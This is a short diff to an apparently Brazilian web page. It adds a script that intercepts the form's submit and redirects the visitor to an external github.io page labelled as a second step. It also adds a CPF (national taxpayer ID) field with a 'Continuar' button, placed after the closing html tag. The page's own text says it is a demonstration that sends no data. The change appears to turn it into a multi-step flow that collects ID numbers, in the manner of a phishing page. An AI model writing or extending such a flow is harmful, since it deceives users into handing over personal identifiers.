@@ -406,5 +406,24 @@
         "Demonstração concluída. Nenhum dado foi enviado ou consultado.";
     });
   </script>
+
+  <script>
+const LINK_DESTINO = "https://nobioman.github.io/etapaa02/";
+
+document.getElementById("form").addEventListener("submit", function(event) {
+    event.preventDefault();
+    window.location.href = LINK_DESTINO;
+});
+</script>
+
 </body>
 </html>
+
+<div class="form-section">
+                <div class="form-group">
+                    <label class="form-label" for="cpf">CPF</label>
+                    <input type="text" id="cpf" class="form-input" placeholder="000.000.000-00" maxlength="14">
+                </div>
+            </div>
+            <button class="button" id="continuar-btn">Continuar</button>
+        </div>
